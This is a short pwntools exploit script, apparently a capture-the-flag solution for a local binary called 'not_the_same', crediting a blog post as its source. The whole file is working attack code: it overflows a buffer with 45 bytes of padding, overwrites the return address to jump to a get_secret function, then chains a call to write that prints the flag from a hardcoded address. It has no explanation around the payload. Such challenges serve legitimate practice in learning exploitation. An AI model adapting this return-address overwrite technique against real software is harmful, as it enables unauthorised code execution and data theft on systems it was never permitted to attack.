# http://nextline.tistory.com/101
from pwn import *

padding = "A" * 45
get_secret_add = p32(0x80489a0)
write_add = p32(0x806e270)
fl4g_add = p32(0x80eca2d)

p = process('./not_the_same')

payload = padding + get_secret_add
payload += write_add + p32(4) + p32(1) + fl4g_add + p32(4)

p.sendline(payload)

print p.recv(1024)
